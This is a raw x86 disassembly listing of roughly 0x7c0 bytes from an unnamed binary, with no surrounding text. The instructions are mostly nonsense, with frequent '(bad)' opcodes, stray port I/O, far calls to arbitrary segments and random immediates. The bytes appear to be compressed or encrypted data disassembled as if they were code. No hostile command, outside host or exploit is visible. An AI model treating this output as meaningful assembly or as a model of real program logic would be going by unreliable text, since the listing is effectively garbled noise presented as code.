  41ff69:	dec    ebp
  41ff6a:	repz sub ebx,DWORD PTR gs:[ecx+0x6f116e1d]
  41ff72:	lods   eax,DWORD PTR ds:[esi]
  41ff73:	adc    DWORD PTR [ebx-0x5b5d1f60],ecx
  41ff79:	mul    BYTE PTR [eax]
  41ff7b:	enter  0x5d65,0x24
  41ff7f:	cmp    cl,BYTE PTR [eax]
  41ff81:	mov    al,0xb7
  41ff83:	push   0x6
  41ff85:	cmp    DWORD PTR [esi+eax*4],esi
  41ff88:	(bad)  
  41ff89:	sbb    BYTE PTR [ebx-0x26ab9bbb],ch
  41ff8f:	jo     0x41ff3e
  41ff91:	xor    BYTE PTR [ebx-0x43d142ce],bl
  41ff97:	inc    edx
  41ff98:	jge    0x41ff3f
  41ff9a:	or     ah,BYTE PTR es:[esp+eiz*8-0x2fb04e59]
  41ffa2:	mov    esp,0x36af566f
  41ffa7:	sub    DWORD PTR [edi-0x197502eb],ecx
  41ffad:	(bad)  
  41ffae:	xchg   edi,eax
  41ffaf:	push   cs
  41ffb0:	xlat   BYTE PTR ds:[ebx]
  41ffb1:	inc    esi
  41ffb2:	mov    eax,ds:0xd1533b7
  41ffb7:	js     0x41ffc2
  41ffb9:	or     ebx,ecx
  41ffbb:	retf   
  41ffbc:	jge    0x420009
  41ffbe:	dec    esi
  41ffbf:	mov    bl,0xbb
  41ffc1:	out    dx,eax
  41ffc2:	and    al,0xa7
  41ffc4:	push   ss
  41ffc5:	(bad)  
  41ffc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ffc7:	das    
  41ffc8:	xor    al,0xac
  41ffca:	push   edi
  41ffcb:	shl    BYTE PTR [eax],0xa6
  41ffce:	and    ebp,0x7c
  41ffd1:	sbb    BYTE PTR [ebx],ah
  41ffd3:	xor    edi,DWORD PTR [ecx+0x55c8884f]
  41ffd9:	xchg   edi,eax
  41ffdb:	out    0x2,eax
  41ffdd:	mov    cl,BYTE PTR [eax+0x7b]
  41ffe0:	mov    ebp,DWORD PTR [eax-0x30]
  41ffe3:	aam    0xb6
  41ffe5:	xlat   BYTE PTR ds:[ebx]
  41ffe6:	or     al,0x6e
  41ffe8:	test   cl,dl
  41ffea:	lods   eax,DWORD PTR ds:[esi]
  41ffeb:	sbb    BYTE PTR [ebp+0x23f0ac98],ch
  41fff1:	sar    DWORD PTR [edx-0x31],1
  41fff4:	out    0x9e,eax
  41fff6:	pop    esp
  41fff7:	fwait
  41fff8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fff9:	call   ecx
  41fffb:	cmp    ecx,DWORD PTR [ebx]
  41fffd:	aas    
  41fffe:	jg     0x41ffd8
  420000:	cdq    
  420001:	lock dec eax
  420003:	cli    
  420004:	push   cs
  420005:	sub    DWORD PTR [esi-0x45],edx
  420008:	xchg   edi,eax
  420009:	mov    al,0x2b
  42000b:	stc    
  42000c:	adc    ah,BYTE PTR [eax-0x76]
  42000f:	fdiv   DWORD PTR [esi]
  420011:	int    0x48
  420013:	mov    ds:0xbf366e7b,al
  420018:	into   
  420019:	out    0xfd,al
  42001b:	jmp    0x42008d
  42001d:	sub    DWORD PTR [ecx-0x1115c2df],edi
  420023:	push   cs
  420024:	mov    ebx,0x8d22b76d
  420029:	inc    esi
  42002a:	scas   eax,DWORD PTR es:[edi]
  42002b:	push   ebp
  42002c:	jecxz  0x42006d
  42002e:	fbld   TBYTE PTR [eax-0x67a24c3b]
  420034:	cld    
  420035:	fdivr  DWORD PTR [esi-0x7f856908]
  42003b:	mov    al,ds:0x88110dd3
  420040:	ja     0x420050
  420042:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420043:	dec    cx
  420045:	mov    WORD PTR [edx*4+0x7a52fa68],ss
  42004c:	or     al,0xf6
  42004e:	stc    
  42004f:	dec    esi
  420050:	aam    0xce
  420052:	inc    edi
  420053:	jne    0x420007
  420055:	mov    cl,0x80
  420057:	sbb    esp,ebx
  420059:	push   ecx
  42005a:	call   0x9a31:0x7035dc36
  420061:	jge    0x42008d
  420063:	cli    
  420064:	mov    esp,0x4c97e4f9
  420069:	pop    ebp
  42006a:	lea    ebx,[edx]
  42006c:	imul   ebp,DWORD PTR [ecx+0x44d51051],0x58
  420073:	jae    0x4200d1
  420075:	scas   al,BYTE PTR es:[edi]
  420076:	pushf  
  420077:	out    dx,al
  420078:	pop    ecx
  420079:	mov    ds:0x1e126ec6,eax
  42007e:	popa   
  42007f:	sbb    DWORD PTR [ebp+0x45],edi
  420082:	xor    ebx,DWORD PTR [edi+0x79]
  420085:	sbb    eax,0xc8c8dba1
  42008a:	call   0x9d38a92
  42008f:	repz adc ebx,DWORD PTR [eax-0xd27033f]
  420096:	push   ebp
  420097:	pop    ss
  420098:	mov    al,ds:0x1fdfdc51
  42009d:	ret    0xf391
  4200a0:	pop    esp
  4200a1:	ds mov ebx,0x9bc4d765
  4200a7:	ja     0x420082
  4200a9:	and    eax,DWORD PTR [ebx-0x6e814039]
  4200af:	jae    0x4200d6
  4200b1:	jp     0x4200f9
  4200b3:	jge    0x4200de
  4200b5:	mov    BYTE PTR [edx+edi*4-0x5a674c7e],dh
  4200bc:	fsub   QWORD PTR [esp+ebx*2-0x32]
  4200c0:	repz loope 0x4200f7
  4200c3:	xor    BYTE PTR [esi+0x2a1b37e0],bl
  4200c9:	sti    
  4200ca:	xchg   esi,eax
  4200cb:	mov    ah,0x47
  4200cd:	outs   dx,BYTE PTR ds:[esi]
  4200ce:	inc    ebp
  4200cf:	inc    ebp
  4200d0:	inc    edi
  4200d1:	(bad)  
  4200d3:	out    dx,eax
  4200d4:	push   ecx
  4200d5:	loope  0x42010d
  4200d7:	pop    ss
  4200d8:	loopne 0x420098
  4200da:	pop    esp
  4200db:	sbb    eax,0x57f1c7c5
  4200e0:	xchg   edx,eax
  4200e1:	pop    ecx
  4200e2:	repnz das 
  4200e4:	pop    edi
  4200e5:	cld    
  4200e6:	aaa    
  4200e7:	mov    DWORD PTR [edi],ecx
  4200e9:	push   esp
  4200ea:	and    ebp,DWORD PTR [ebx-0x42]
  4200ed:	int3   
  4200ee:	pop    esi
  4200ef:	mov    eax,0x12647e73
  4200f4:	lods   eax,DWORD PTR ds:[esi]
  4200f5:	icebp  
  4200f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4200f7:	xchg   edi,eax
  4200f8:	dec    eax
  4200f9:	(bad)  
  4200fa:	popa   
  4200fb:	ja     0x4200e6
  4200fd:	pop    esp
  4200fe:	add    ah,bh
  420100:	or     eax,0x7ae6077c
  420105:	sar    BYTE PTR [eax],cl
  420107:	inc    edi
  420108:	push   es
  420109:	ret    0x2779
  42010c:	int3   
  42010d:	out    0xb8,eax
  42010f:	mov    al,gs:0xd0dce52c
  420115:	mov    cl,0x94
  420117:	xchg   ebp,eax
  420118:	aad    0xe9
  42011a:	cmp    ecx,DWORD PTR [ebx]
  42011c:	or     al,0xea
  42011e:	mov    dl,0x9a
  420120:	xchg   esi,eax
  420121:	add    al,BYTE PTR [eax+0x44120dea]
  420127:	jno    0x420171
  420129:	out    0xe7,eax
  42012b:	sbb    eax,0x251dd135
  420130:	mov    al,ds:0x1ab43a42
  420135:	cdq    
  420136:	fbstp  TBYTE PTR [edx+0x38]
  420139:	push   cs
  42013a:	xlat   BYTE PTR ds:[ebx]
  42013b:	jnp    0x42017e
  42013d:	pop    ebp
  42013e:	sub    bh,BYTE PTR [esi-0x74]
  420141:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420142:	out    0xa8,eax
  420144:	test   al,0x62
  420146:	fcmovbe st,st(7)
  420148:	out    0x9f,al
  42014a:	sbb    ebx,eax
  42014c:	gs cmc 
  42014e:	sahf   
  42014f:	mov    bl,0xab
  420151:	popf   
  420152:	inc    eax
  420153:	lods   al,BYTE PTR ds:[esi]
  420154:	aas    
  420155:	cmp    DWORD PTR [edi-0x33a0d3b9],edi
  42015b:	or     ah,BYTE PTR [edi+eiz*2+0x7]
  42015f:	retf   
  420160:	fcmovu st,st(7)
  420162:	retf   
  420163:	outs   dx,DWORD PTR ds:[esi]
  420164:	push   0x52fd2d95
  420169:	xor    ebx,esp
  42016b:	repz dec esp
  42016d:	call   FWORD PTR [eax-0xdf19dc9]
  420173:	sti    
  420174:	pop    es
  420175:	or     al,0x68
  420177:	jne    0x42018c
  420179:	jns    0x420172
  42017b:	adc    ecx,DWORD PTR [ecx+0x76]
  42017e:	in     al,dx
	...
  420187:	add    BYTE PTR [eax],al
  420189:	add    BYTE PTR [ecx+0x57],bl
  42018c:	inc    ecx
  42018d:	dec    ebx
  42018e:	dec    edi
  42018f:	pop    edi
  420190:	pop    ebx
  420191:	push   edi
  420192:	sub    al,0x52
  420194:	xchg   DWORD PTR [ebx-0x62],esi
  420197:	fisttp DWORD PTR [edx+0x190c71d]
  42019d:	add    BYTE PTR [ebp+0x6],bh
  4201a0:	add    BYTE PTR [eax],al
  4201a2:	jns    0x42012d
  4201a4:	jg     0x42014c
  4201a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4201a7:	push   ds
  4201a8:	arpl   WORD PTR [esi+ecx*8+0x6352d14a],sp
  4201af:	push   es
  4201b0:	repnz das 
  4201b2:	xor    al,0x8e
  4201b4:	pop    edx
  4201b5:	aaa    
  4201b6:	cli    
  4201b7:	sahf   
  4201b8:	adc    dl,bh
  4201ba:	sub    esi,DWORD PTR [edi-0x2f26873a]
  4201c0:	ss xor eax,0x8c1e626a
  4201c6:	or     ah,BYTE PTR [ecx+0x62]
  4201c9:	push   esp
  4201ca:	gs loopne 0x4201cc
  4201cd:	es mov dh,0xc8
  4201d0:	cmp    eax,0x9373c563
  4201d5:	js     0x420224
  4201d7:	mov    esp,0x6e93c230
  4201dc:	aaa    
  4201dd:	in     eax,0xfc
  4201df:	or     ebx,DWORD PTR [ecx-0x5802fe72]
  4201e5:	mov    eax,ds:0x7e72b552
  4201ea:	adc    ah,BYTE PTR [eax+0x28807194]
  4201f0:	in     al,dx
  4201f1:	out    0x94,al
  4201f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4201f4:	(bad)  
  4201f5:	jl     0x4201b9
  4201f7:	push   eax
  4201f8:	lahf   
  4201f9:	sbb    DWORD PTR [edx+ecx*4+0x14ac776b],0xb66ea80
  420204:	(bad)  
  420205:	or     BYTE PTR ds:0x65204e38,ch
  42020b:	inc    ebp
  42020c:	loopne 0x420194
  42020e:	mov    ds:0x20df6d57,al
  420213:	scas   eax,DWORD PTR es:[edi]
  420214:	xor    al,0x34
  420216:	push   cs
  420217:	pop    edx
  420218:	out    0x96,eax
  42021a:	je     0x42026c
  42021c:	outs   dx,DWORD PTR gs:[esi]
  42021e:	or     al,0x77
  420220:	cmp    dh,dh
  420222:	adc    al,BYTE PTR [edx+0x40]
  420225:	mov    ds:0x106aee01,eax
  42022a:	sbb    BYTE PTR [esi+esi*2+0x62],al
  42022e:	mov    ch,0x29
  420230:	mov    dh,BYTE PTR [ecx+0x75a952cc]
  420236:	enter  0xf5,0xf2
  42023a:	mov    BYTE PTR ds:0x6decea4e,ch
  420240:	push   ss
  420241:	scas   al,BYTE PTR es:[edi]
  420242:	aad    0xf9
  420244:	inc    edx
  420245:	cmp    ebx,edi
  420247:	(bad)  [esi]
  420249:	pop    ds
  42024a:	ret    0xff06
  42024d:	jne    0x4201d3
  42024f:	xchg   edi,eax
  420250:	retf   0xf057
  420253:	in     eax,0xf3
  420255:	adc    DWORD PTR [esi-0x13],esi
  420258:	iret   
  420259:	mov    bl,0x51
  42025b:	fidiv  DWORD PTR [ecx]
  42025d:	dec    esp
  42025e:	cs push 0x26
  420261:	cmp    esp,DWORD PTR [eax+0x71172fe9]
  420267:	ret    0x464b
  42026a:	aad    0x4
  42026c:	mov    fs,ebp
  42026e:	(bad)  
  420270:	dec    ebx
  420271:	xchg   esi,eax
  420272:	(bad)  
  420273:	jne    0x4202cd
  420275:	popf   
  420276:	addr16 call 0x2e8b6bdf
  42027c:	sub    ecx,edx
  42027e:	scas   al,BYTE PTR es:[edi]
  42027f:	adc    ah,BYTE PTR [edi-0x1]
  420282:	sub    DWORD PTR [edx+eax*2],edi
  420285:	cs pop ebx
  420287:	and    al,0xc5
  420289:	mov    ch,0xc
  42028b:	gs pop esi
  42028d:	xchg   DWORD PTR es:[edi+eax*2-0x339e0e84],ebx
  420295:	mov    ah,0xfb
  420297:	push   0xffffffbb
  420299:	fmul   DWORD PTR [ebx-0x385650d8]
  42029f:	adc    al,0xaa
  4202a1:	ins    DWORD PTR es:[edi],dx
  4202a2:	jmp    0x6770cd1
  4202a7:	in     eax,dx
  4202a8:	pop    ebx
  4202a9:	mov    ebx,0xe5ffa69a
  4202ae:	stos   BYTE PTR es:[edi],al
  4202af:	rcl    edi,cl
  4202b1:	fs ret 0xf0c2
  4202b5:	bound  eax,QWORD PTR [edi+0x5c]
  4202b8:	xchg   esp,eax
  4202b9:	push   edx
  4202ba:	mov    dh,0x30
  4202bc:	and    edi,DWORD PTR [esi-0x44]
  4202bf:	push   edx
  4202c0:	sbb    edi,DWORD PTR [ebx-0x30689ba3]
  4202c6:	and    eax,DWORD PTR [esi-0x4c202535]
  4202cc:	mov    al,ds:0x42a56084
  4202d1:	mov    ds:0x2cb76414,al
  4202d6:	mov    ds:0xf067dca9,al
  4202db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4202dc:	pop    eax
  4202dd:	jge    0x42028a
  4202df:	pop    eax
  4202e0:	dec    eax
  4202e1:	jb     0x4202a6
  4202e3:	std    
  4202e4:	pusha  
  4202e5:	push   ecx
  4202e6:	or     esi,DWORD PTR [esi+0x64a3ee8a]
  4202ec:	sub    eax,0x2729da28
  4202f1:	sbb    bh,ch
  4202f3:	cmc    
  4202f4:	push   0x69910b96
  4202f9:	xor    DWORD PTR [ebx],0xe0f1963c
  4202ff:	cmp    eax,0x405e0141
  420304:	xchg   ebx,eax
  420305:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420306:	(bad)  
  420307:	repz cmp esi,DWORD PTR [esi]
  42030a:	dec    edi
  42030b:	and    edx,DWORD PTR [edx+0x72763357]
  420311:	adc    DWORD PTR [edx],ecx
  420313:	iret   
  420314:	jmp    0x66ed:0x8023497a
  42031b:	push   edi
  42031c:	dec    ebp
  42031d:	pop    es
  42031e:	mul    BYTE PTR [eax]
  420320:	cmp    DWORD PTR [esi],ebp
  420322:	add    DWORD PTR [ebp-0xf],eax
  420325:	xchg   esp,eax
  420326:	push   esi
  420327:	jge    0x420364
  420329:	xchg   DWORD PTR [ebp-0x5a],esp
  42032c:	outs   dx,BYTE PTR ds:[esi]
  42032d:	sbb    ebx,DWORD PTR [ebx]
  42032f:	xlat   BYTE PTR ds:[ebx]
  420330:	fwait
  420331:	imul   ebx,DWORD PTR [esi-0x5c],0xf8583c07
  420338:	mov    ds:0xb0182270,eax
  42033d:	out    0x90,al
  42033f:	sbb    edx,ebx
  420341:	pop    ds
  420342:	xchg   ebp,eax
  420343:	adc    dh,BYTE PTR [esi]
  420345:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420346:	pop    eax
  420347:	sbb    al,0xb0
  420349:	sbb    al,0xbd
  42034b:	sbb    al,bl
  42034d:	das    
  42034e:	mov    ebp,cr4
  420351:	xor    eax,0xd35e40c1
  420356:	jbe    0x4203a0
  420358:	and    DWORD PTR [edx-0x1f],ebx
  42035b:	dec    ebx
  42035c:	in     eax,dx
  42035d:	dec    esi
  42035e:	xor    BYTE PTR [ecx+0x4811d7a0],bh
  420364:	ds enter 0xaeae,0xbb
  420369:	stos   BYTE PTR es:[edi],al
  42036a:	mov    edi,0xed34865a
  42036f:	test   DWORD PTR [ebx+0x1],0x7b926741
  420376:	xchg   ecx,eax
  420377:	add    BYTE PTR [ecx-0x32],bl
  42037a:	je     0x4203ec
  42037c:	and    BYTE PTR [ebp+0x6808639],dh
  420382:	frstor [edx-0x80]
  420385:	dec    esi
  420386:	push   es
  420387:	loope  0x420365
  420389:	rcl    BYTE PTR [ebp+esi*1-0x48],cl
  42038d:	mov    al,0x8a
  42038f:	sahf   
  420390:	scas   eax,DWORD PTR es:[edi]
  420391:	aaa    
  420392:	pop    edx
  420393:	xlat   BYTE PTR ds:[ebx]
  420394:	shr    esi,0x89
  420397:	popa   
  420398:	pop    eax
  420399:	lds    edx,FWORD PTR [ebp+ebx*4-0x53]
  42039d:	stos   BYTE PTR es:[edi],al
  42039e:	mov    BYTE PTR [ecx+0x66],bh
  4203a1:	or     al,0xdd
  4203a3:	js     0x4203f6
  4203a5:	pop    esi
  4203a6:	jnp    0x4203fe
  4203a8:	arpl   WORD PTR [ebx+0x2d],cx
  4203ab:	or     DWORD PTR [esi-0x4b],0xffffffae
  4203af:	xchg   edx,eax
  4203b0:	cs sub dl,dh
  4203b3:	mov    ecx,0xb6cd06d1
  4203b8:	mov    ds:0xe1be6a07,eax
  4203bd:	mov    ?,ebx
  4203bf:	dec    ecx
  4203c0:	push   esp
  4203c1:	ror    DWORD PTR [ebx],1
  4203c3:	repnz not DWORD PTR [ebp-0x1]
  4203c7:	loop   0x4203f5
  4203c9:	inc    ebp
  4203ca:	bound  edx,QWORD PTR [ebx-0x56]
  4203cd:	sbb    al,0xfc
  4203cf:	push   ecx
  4203d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4203d1:	pop    ebp
  4203d2:	ins    BYTE PTR es:[edi],dx
  4203d3:	retf   
  4203d4:	scas   al,BYTE PTR es:[edi]
  4203d5:	pop    esi
  4203d6:	mov    ebx,DWORD PTR [eax]
  4203d8:	adc    al,0x5b
  4203da:	cmp    al,0xcf
  4203dc:	sub    eax,0xe3dde9e3
  4203e1:	fistp  DWORD PTR [edx-0x52]
  4203e4:	popa   
  4203e5:	loope  0x4203db
  4203e7:	cmp    BYTE PTR es:[edi-0x17],ah
  4203eb:	arpl   WORD PTR [eax-0x380619b7],ax
  4203f1:	std    
  4203f2:	ss lock and ch,dl
  4203f6:	pop    edx
  4203f7:	and    al,0x31
  4203f9:	mul    DWORD PTR [ebx]
  4203fb:	dec    ebp
  4203fc:	add    DWORD PTR [ebx+edi*4],eax
  4203ff:	cmc    
  420400:	ret    
  420401:	or     eax,DWORD PTR [ebx+ecx*1]
  420404:	pop    esi
  420405:	pop    edi
  420406:	pop    ebx
  420407:	xor    DWORD PTR [edx],edx
  420409:	scas   al,BYTE PTR es:[edi]
  42040a:	jp     0x4203bc
  42040c:	in     eax,dx
  42040d:	xchg   esp,eax
  42040e:	inc    esi
  42040f:	jno    0x4203f6
  420411:	xchg   esi,eax
  420412:	push   ss
  420413:	ja     0x4203c1
  420415:	in     al,0x36
  420417:	cwde   
  420418:	sar    ch,0x45
  42041b:	(bad)  
  42041c:	lods   al,BYTE PTR ds:[esi]
  42041d:	pop    es
  42041e:	mov    ds:0x5321575f,eax
  420423:	mov    ebx,0x840336dc
  420428:	mov    ds:0x4ddd780c,al
  42042d:	ret    
  42042e:	xchg   ebp,eax
  42042f:	push   edx
  420430:	call   0xb2f8:0x8265c0
  420437:	cmp    esp,ebx
  420439:	jge    0x42047d
  42043b:	js     0x42044c
  42043d:	mov    edx,DWORD PTR [edx+0x4e436a1]
  420443:	pop    edx
  420444:	adc    bl,BYTE PTR [edi+eiz*1]
  420447:	jl     0x420492
  420449:	cs inc ebx
  42044b:	sub    bh,cl
  42044d:	js     0x420483
  42044f:	sub    BYTE PTR [ebp+0x9],cl
  420452:	xchg   esi,eax
  420453:	push   cs
  420454:	sahf   
  420455:	mov    edi,0x5d3ba4c4
  42045a:	sub    al,0xa1
  42045c:	mov    esp,ecx
  42045e:	shr    ch,0x32
  420461:	xchg   esp,eax
  420462:	pop    es
  420463:	lea    edx,[ebx+ebp*2]
  420466:	stos   BYTE PTR es:[edi],al
  420467:	lods   al,BYTE PTR ds:[esi]
  420468:	fcmovnb st,st(5)
  42046a:	daa    
  42046b:	cli    
  42046c:	jo     0x42041f
  42046e:	or     BYTE PTR [eax+0x6d],cl
  420471:	repz aad 0xe6
  420474:	jg     0x420420
  420476:	imul   ebp
  420478:	inc    ecx
  420479:	daa    
  42047a:	clc    
  42047b:	cmp    DWORD PTR [edx],0xb06e1f8
  420481:	xchg   esi,eax
  420482:	and    cl,0x3c
  420485:	jp     0x420501
  420487:	fwait
  420488:	push   ds
  420489:	retf   
  42048a:	(bad)  
  42048c:	add    edi,edx
  42048e:	sub    ebx,DWORD PTR [edi+0x15]
  420491:	jecxz  0x42050c
  420493:	int3   
  420494:	les    edi,FWORD PTR [ebp-0x66b2384f]
  42049a:	push   0xffffff88
  42049c:	std    
  42049d:	icebp  
  42049e:	or     cl,BYTE PTR [ebx+0x73]
  4204a1:	(bad)  
  4204a2:	push   0xffffff97
  4204a4:	cmp    eax,0x3743f987
  4204a9:	dec    ecx
  4204aa:	fidiv  WORD PTR [ebx-0x74]
  4204ad:	lock popf 
  4204af:	cmp    al,0x24
  4204b1:	mov    BYTE PTR [ecx-0x8597dc8],bl
  4204b7:	je     0x420494
  4204b9:	aam    0xdf
  4204bb:	rcl    DWORD PTR [ebx],1
  4204bd:	int    0xad
  4204bf:	stc    
  4204c0:	daa    
  4204c1:	sbb    DWORD PTR [ecx+0x77dd011c],edi
  4204c7:	mov    eax,ds:0x836d5b2b
  4204cc:	inc    edi
  4204cd:	mov    bl,0x49
  4204cf:	lds    di,DWORD PTR [edx+0x29]
  4204d3:	xchg   ebx,eax
  4204d4:	add    eax,0xb6c1fefa
  4204d9:	nop
  4204da:	xor    BYTE PTR [eax+ecx*2+0x6494c742],bl
  4204e1:	nop
  4204e2:	jecxz  0x420505
  4204e4:	jp     0x4204e4
  4204e6:	dec    esp
  4204e7:	(bad)  
  4204e9:	clc    
  4204ea:	xchg   esi,eax
  4204eb:	pop    ds
  4204ec:	in     eax,0x72
  4204ee:	pop    ebp
  4204ef:	add    dh,al
  4204f1:	sub    bl,BYTE PTR [ecx-0x14]
  4204f4:	mov    bl,0xf2
  4204f6:	xchg   ebp,eax
  4204f7:	jmp    0x4815:0x96d05e80
  4204fe:	xor    ecx,DWORD PTR [ebx]
  420500:	cmp    BYTE PTR [edx-0x55],0x4b
  420504:	push   es
  420505:	lock mov dh,0xd2
  420508:	mov    esi,0x5d1c94e0
  42050d:	push   es
  42050e:	inc    eax
  42050f:	mov    esi,0x697bd33d
  420514:	mov    ebp,0xac9fcbc8
  420519:	add    esp,DWORD PTR [esi+0x4ebe9def]
  42051f:	call   0xc736:0x287d4751
  420526:	fs jo  0x42057f
  420529:	(bad)  
  42052a:	ficom  WORD PTR [edi+0x4505cf90]
  420530:	mov    esi,0xa7c2b7c6
  420535:	lea    ebx,[edx]
  420537:	ja     0x4204f9
  420539:	and    esp,DWORD PTR [ecx-0x6a]
  42053c:	test   eax,0x334505dd
  420541:	add    esi,DWORD PTR [ebx+0x3]
  420544:	fucomi st,st(4)
  420546:	dec    edx
  420547:	push   ss
  420548:	xor    eax,DWORD PTR [esi]
  42054a:	cmc    
  42054b:	add    eax,0x37e6f30d
  420550:	dec    edx
  420551:	imul   esp,edi,0x52723e55
  420557:	jae    0x42059e
  420559:	daa    
  42055a:	and    eax,0x55009988
  42055f:	in     al,0x72
  420561:	mov    ecx,0x84e0c59d
  420566:	mov    cl,0x91
  420568:	and    eax,0xfee5ab85
  42056d:	fcomp  QWORD PTR [esi]
  42056f:	shr    ch,0x93
  420572:	jbe    0x420533
  420574:	imul   ebx,edx,0xffffff90
  420577:	add    DWORD PTR [edx-0x5b7392fd],ebp
  42057d:	cli    
  42057e:	or     al,0xd5
  420580:	ss inc ebx
  420582:	sub    eax,0xc8ed4f8e
  420587:	inc    esp
  420588:	(bad)  
  420589:	push   cs
  42058a:	retf   
  42058b:	lods   al,BYTE PTR ds:[esi]
  42058c:	pop    es
  42058d:	outs   dx,BYTE PTR ds:[esi]
  42058e:	push   esp
  42058f:	scas   al,BYTE PTR es:[edi]
  420590:	mov    ds:0x1e05b10a,al
  420595:	mov    edi,0xff291211
  42059a:	xor    dh,BYTE PTR [esi+0x7f]
  42059d:	cld    
  42059e:	xor    BYTE PTR [esi-0x30184aa3],bh
  4205a4:	or     DWORD PTR [esi-0x125c559f],esp
  4205aa:	pushw  ds
  4205ac:	xchg   ebx,eax
  4205ad:	mov    gs,WORD PTR [esi]
  4205af:	mov    dh,0x9
  4205b1:	aam    0x17
  4205b3:	pop    ebx
  4205b4:	pop    ecx
  4205b5:	sub    DWORD PTR [ebp-0x36],ecx
  4205b8:	xor    dh,ah
  4205ba:	sub    eax,0xca1a5852
  4205bf:	mov    edi,0x75b61c33
  4205c4:	pop    edx
  4205c5:	dec    ebx
  4205c6:	jg     0x420557
  4205c8:	push   ecx
  4205c9:	mov    al,ds:0xf88ac7fd
  4205ce:	mov    eax,0x3b884a28
  4205d3:	add    eax,0xa0b541d6
  4205d8:	stos   DWORD PTR es:[edi],eax
  4205d9:	retf   0x46e5
  4205dc:	pop    ecx
  4205dd:	int3   
  4205de:	mov    esi,0xaf33b4a2
  4205e3:	mov    dh,0x9f
  4205e5:	sub    al,0xe8
  4205e7:	xor    ah,BYTE PTR [ebp+ebx*2-0x4d12ca9e]
  4205ee:	or     al,0xf1
  4205f0:	mov    DWORD PTR [ecx-0x6f794f1a],ecx
  4205f6:	pusha  
  4205f7:	into   
  4205f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4205f9:	cs aas 
  4205fb:	pop    eax
  4205fc:	mov    ebx,0x8f1b7aab
  420601:	jp     0x420636
  420603:	popa   
  420604:	call   0x52810d07
  420609:	ds cmp al,0xd8
  42060c:	push   esi
  42060d:	sar    ecx,1
  42060f:	inc    esp
  420610:	fisttp QWORD PTR gs:[eax]
  420613:	and    BYTE PTR [ebp+0x5439e1f4],dh
  420619:	fidivr DWORD PTR [ebx-0x6f]
  42061c:	mov    edx,0xd15f0f1c
  420621:	repnz mov eax,DWORD PTR [edx+0x48]
  420625:	leave  
  420626:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420627:	ror    ch,1
  420629:	inc    ecx
  42062a:	xor    ecx,DWORD PTR [esi-0x1a4c8676]
  420630:	(bad)  
  420631:	mov    esp,0xd1f75f2c
  420636:	jle    0x4206a2
  420638:	in     eax,dx
  420639:	sbb    BYTE PTR [ebp+eax*1-0x1bb4bf56],dh
  420640:	test   eax,0x9ac37216
  420645:	jno    0x4205dd
  420647:	dec    esi
  420648:	xor    al,0xea
  42064a:	dec    edx
  42064b:	push   ds
  42064c:	inc    esp
  42064d:	add    DWORD PTR [ebp-0x2b77764],0x8973c74a
  420657:	rcr    DWORD PTR ss:[ecx+0x51],cl
  42065b:	xchg   eax,edx
  42065d:	imul   ebp,DWORD PTR [ebx+0x3c],0x3e
  420661:	or     BYTE PTR [ebp+edx*2+0x52cc175b],cl
  420668:	in     eax,dx
  420669:	mov    WORD PTR [ebx-0x39d43c9a],gs
  42066f:	or     ebx,DWORD PTR [ecx]
  420671:	push   0x8
  420673:	push   ds
  420674:	mov    ebx,DWORD PTR ds:[ecx]
  420677:	gs jp  0x4206f5
  42067a:	adc    esp,ebp
  42067c:	sbb    DWORD PTR [edx+ebp*2+0x721ef47d],ecx
  420683:	mov    ah,0x46
  420685:	sti    
  420686:	test   ebx,edx
  420688:	cmp    DWORD PTR [edx+0x12],edi
  42068b:	lahf   
  42068c:	stos   BYTE PTR es:[di],al
  42068e:	sbb    bl,dh
  420690:	repnz mov ds:0xcd6e7ec6,al
  420696:	mov    bh,bh
  420698:	add    DWORD PTR [edi+0x130a1d52],eax
  42069e:	stos   DWORD PTR es:[edi],eax
  42069f:	mov    bl,0xc
  4206a1:	xchg   BYTE PTR [edi],dh
  4206a3:	pop    ss
  4206a4:	adc    edx,DWORD PTR [esp+edx*4]
  4206a7:	repz add eax,0xa86abe3f
  4206ad:	outs   dx,DWORD PTR ds:[esi]
  4206ae:	cdq    
  4206af:	xor    eax,DWORD PTR [edx]
  4206b1:	jle    0x42071a
  4206b3:	mov    dl,0x96
  4206b5:	pop    eax
  4206b6:	in     al,dx
  4206b7:	mov    ebx,0xa1e81c6b
  4206bc:	enter  0xfe60,0x4c
  4206c0:	hlt    
  4206c1:	out    0xce,al
  4206c3:	jne    0x4206b5
  4206c5:	ins    BYTE PTR es:[edi],dx
  4206c6:	jno    0x42071d
  4206c8:	xchg   DWORD PTR [edi],ecx
  4206ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4206cb:	pop    ebx
  4206cc:	in     eax,dx
  4206cd:	cmp    edx,DWORD PTR [ecx+0x67020507]
  4206d3:	div    DWORD PTR [esi-0x3e56b74f]
  4206d9:	adc    edx,DWORD PTR [ebp+esi*2+0x2e78c41f]
  4206e0:	push   esp
  4206e1:	cmp    edi,edx
  4206e3:	std    
  4206e4:	xchg   ebx,eax
  4206e5:	push   edi
  4206e6:	fwait
  4206e7:	pop    edi
  4206e8:	mov    ds:0x45c65eb,al
  4206ed:	mov    al,0x56
  4206ef:	js     0x4206f0
  4206f1:	mov    eax,0x4d266ef0
  4206f7:	call   0x6c92df50
  4206fc:	into   
  4206fd:	mov    edx,0xd3023549
  420702:	inc    ecx
  420703:	mov    esp,DWORD PTR [eax-0x18113f79]
  420709:	popf   
  42070a:	pop    edi
  42070b:	mov    ds:0x83ccf587,eax
  420710:	add    al,al
  420712:	daa    
  420713:	jnp    0x420739
  420715:	mov    db5,eax
  420718:	adc    eax,0x9496e39e
  42071d:	xchg   edi,eax
  42071e:	push   edx
  42071f:	cmp    esp,DWORD PTR [ebx]
  420721:	in     al,dx
  420722:	mov    ecx,0x86ede60d
  420727:	xchg   ah,bh
